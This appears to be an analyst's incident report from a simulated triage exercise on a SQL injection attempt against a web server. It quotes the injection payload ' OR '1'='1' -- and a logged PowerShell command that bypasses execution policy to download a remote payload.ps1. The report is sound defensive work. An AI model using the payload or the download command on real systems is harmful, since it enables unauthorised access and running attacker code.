## Investigation Report (Answer)

### 1. Verdict

#### **Verdict: True Positive – SQL Injection Attack Attempt**

**Justification:** The firewall captured a request containing a well-known SQL injection payload (`' OR '1'='1' --`), originating from an IP address with a documented history of SQL injection attacks. Threat intelligence confirms both the malicious reputation of the source IP and the payload, indicating a genuine attempt to exploit a public-facing web application.

---

### 2. In-Depth Analysis and Conclusion

The incident was generated by the organization's **Firewall**, which detected an inbound HTTPS request from external IP **198.51.100.23** targeting the public web server **webserver-01 (203.0.113.10)** over **TCP port 443**. Unlike blocked reconnaissance attempts, the firewall log indicates the connection was **ALLOWED**, meaning the malicious request successfully reached the web application.

Inspection of the HTTP request body revealed the payload:

```sql
' OR '1'='1' --
```

This is one of the most recognizable SQL injection payloads. The expression manipulates SQL query logic by forcing the conditional statement to always evaluate as **TRUE**, while the double hyphen (`--`) comments out the remainder of the SQL statement. Attackers commonly use this payload during reconnaissance and exploitation to bypass authentication, enumerate databases, or retrieve unauthorized information from backend databases.

Threat intelligence enrichment further validates the malicious nature of the activity. **AbuseIPDB** reports that **198.51.100.23** has been reported **389 times** for SQL injection attacks, demonstrating a well-established history of malicious behavior. **Hybrid Analysis** independently identifies the extracted payload as malicious and classifies it as a confirmed SQL injection attempt, reinforcing that this was intentional exploitation rather than malformed or accidental input.

The firewall metadata shows the request was **allowed**, which is significant defensively: the logs confirm the malicious payload reached the target application, but do **not** confirm the attack succeeded. There is no evidence of SQL server error messages, unauthorized database responses, data extraction, privilege escalation, web shell deployment, or abnormal outbound traffic. The investigation therefore supports a **confirmed attack attempt**, but **not a confirmed compromise**.

**Threat hunting correlation — reviewed and ruled out:** The threat-hunting telemetry includes a Sysmon event (12/07/2026, 20:37:24 UTC) recording:

```
powershell.exe -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri http://OR11--/payload.ps1"
```

On inspection, the string `OR11--` bears a superficial textual resemblance to the injection payload (`' OR '1'='1' --` with quotes, spaces, and the equals sign stripped out). This was deliberately checked rather than dismissed on host-mismatch grounds alone, given that a shared string across two otherwise-unrelated telemetry sources can indicate the same attacker infrastructure. However, it is assessed as **coincidental and not adopted as a correlation**, for the following reasons:

- The PowerShell execution occurred under **CORP\admin**, an internal account, on **win-srv-01** — there is no session, authentication, or process-lineage pivot connecting it to the external actor at 198.51.100.23 or to webserver-01.
- The SHA256 associated with this PowerShell process (`A1B2C3D4E5F6`) is a static, recurring artifact that has now appeared identically across multiple unrelated prior investigations, consistent with fixed simulation/test telemetry rather than an attacker-controlled payload unique to this incident.
- "OR11--" is a short, low-entropy string; it is plausible for it to appear as a coincidental substring/hostname fragment without representing an actual reused artifact from this specific SQL injection payload.

This is treated as **reviewed, non-correlated telemetry** — noted explicitly rather than silently excluded — and does not change the verdict on this alert.

A firewall entry showing a denied inbound connection from **10.0.5.55** to **192.168.1.10** (13/07/2026, 00:59:50 UTC) is the same recurring log line seen in prior investigations, with no IP, domain, hash, or payload overlap with this incident's indicators. It is assessed as unrelated background noise.

**MITRE ATT&CK mapping discrepancy:** The alert is categorized under **TA0005 – Defense Evasion**, but the mapped technique is **T1190 – Exploit Public-Facing Application**. Per the MITRE ATT&CK framework, T1190 belongs to **TA0001 – Initial Access**, as exploiting an internet-facing application is used to gain an initial foothold rather than to evade defenses. The technique mapping is correct, but the associated tactic in the alert should be **TA0001 – Initial Access**, not TA0005.

#### Conclusion

The investigation confirms a **high-confidence SQL injection attack attempt** against the organization's public-facing web server. The malicious payload, corroborated by threat intelligence and the attacker's known reputation, leaves little doubt regarding intent. Although no evidence currently indicates successful exploitation or data exfiltration, the fact that the firewall allowed the malicious request to reach the web application presents a security risk. Immediate containment should focus on blocking the attacking IP address, reviewing WAF rules, validating application input sanitization, and examining web server and database logs for signs of successful exploitation.
